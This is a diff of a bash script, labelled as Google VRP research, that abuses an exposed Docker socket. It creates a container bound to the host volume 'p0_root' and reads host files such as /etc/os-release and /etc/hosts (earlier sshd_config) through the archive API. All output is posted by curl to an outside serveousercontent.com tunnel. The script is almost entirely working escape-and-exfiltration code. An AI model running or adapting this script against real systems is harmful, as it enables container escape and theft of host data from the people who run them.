@@ -1,30 +1,39 @@
 #!/bin/bash
-URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"
+# TARGET: eca81085c0e34fa1-103-95-173-85.serveousercontent.com
+URL="eca81085c0e34fa1-103-95-173-85.serveousercontent.com"
 
 {
-  echo "=== [!] GOOGLE VRP: FINAL HOST-ROOT SIPHON ==="
+  echo "=== [!] GOOGLE VRP: HOST-IDENTITY SIPHON ==="
+  echo "Timestamp: $(date)"
   
-  # Use the image you confirmed exists in Section [3]
+  # 1. Use the confirmed Alpine image
   IMG="sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659"
 
-  # 1. Create a dummy container to act as a 'Bridge' to the volume
-  ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
+  # 2. Create the Bridge Container mapping the host root volume
+  # This container stays in the 'Created' state to avoid the overlay error
+  RESP=$(curl -s -X POST --unix-socket /var/run/docker.sock \
     -H "Content-Type: application/json" \
-    -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"p0_root:/host_data:ro\"]}}" \
-    http://localhost/containers/create | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
+    -d "{
+      \"Image\": \"$IMG\",
+      \"HostConfig\": { \"Binds\": [\"p0_root:/host_data:ro\"] }
+    }" http://localhost/containers/create)
+  
+  ID=$(echo $RESP | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
 
   if [ -n "$ID" ]; then
-    echo "[+] Bridge Container ID: $ID"
+    echo "[+] Bridge Container Created: $ID"
     
-    echo "--- [!] HOST'S ACTUAL /ETC/HOSTS FILE ---"
-    # We siphon the data through the socket Archive API
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hosts" | tar -xO
+    echo "--- [1] HOST OS VERSION ---"
+    # Siphoning os-release through the Archive API
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/os-release" | tar -xO 2>&1
     
-    echo -e "\n--- [!] HOST'S SSH CONFIG BANNER ---"
-    # Testing the SSH version via the file system
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/ssh/sshd_config" | tar -xO | grep -E "Port|AddressFamily"
+    echo -e "\n--- [2] HOST NETWORK MAP (/etc/hosts) ---"
+    # Siphoning hosts file through the Archive API
+    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hosts" | tar -xO 2>&1
 
-    # Cleanup
+    # Cleanup: Delete the bridge container
     curl -s -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/$ID?force=true" > /dev/null
+  else
+    echo "ERROR: Could not create bridge. Response: $RESP"
   fi
 } | curl -s -X POST --data-binary @- "https://$URL"
